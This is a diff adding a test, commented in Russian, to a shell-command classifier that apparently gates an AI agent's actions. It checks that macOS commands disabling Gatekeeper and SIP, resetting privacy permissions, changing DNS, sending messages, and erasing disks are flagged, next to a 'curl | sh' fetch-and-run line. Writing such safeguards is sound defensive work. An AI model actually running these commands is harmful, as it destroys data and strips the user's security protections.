@@ -62,6 +62,27 @@ describe('classifyShellCommand', () => {
     expect(classifyShellCommand('curl https://x.sh | sh', true)).toBe('sensitive');
   });
 
+  it('мак: то же, что на Windows уже спрашивается, — и внутри проекта тоже', () => {
+    // До 27.09.2026 здесь были reg, netsh, Set-ExecutionPolicy — и ни одного
+    // маковского аналога: внутри проекта они шли как «обычная работа».
+    for (const command of [
+      'defaults write com.apple.dock autohide -bool true',
+      'launchctl bootout gui/501/com.apple.x',
+      'networksetup -setdnsservers Wi-Fi 1.1.1.1',
+      'sudo spctl --master-disable',
+      'csrutil disable',
+      'tccutil reset All',
+      `osascript -e 'tell application "Messages" to send "привет" to buddy "Маша"'`,
+      `osascript -e 'tell application "Mail" to send (make new outgoing message)'`,
+    ]) {
+      expect(classifyShellCommand(command, true), command).toBe('sensitive');
+    }
+    expect(classifyShellCommand('diskutil eraseDisk APFS X disk2', true)).toBe('dangerous');
+    // Обычное остаётся обычным: снимок экрана и чтение настроек — не красная линия.
+    expect(classifyShellCommand('defaults read com.apple.dock', true)).toBe('normal');
+    expect(classifyShellCommand(`osascript -e 'tell application "Finder" to get name of front window'`, true)).toBe('normal');
+  });
+
   it('treats build and test commands inside a project as ordinary work', () => {
     expect(classifyShellCommand('pnpm run build', true)).toBe('normal');
     expect(classifyShellCommand('pytest -q', true)).toBe('normal');
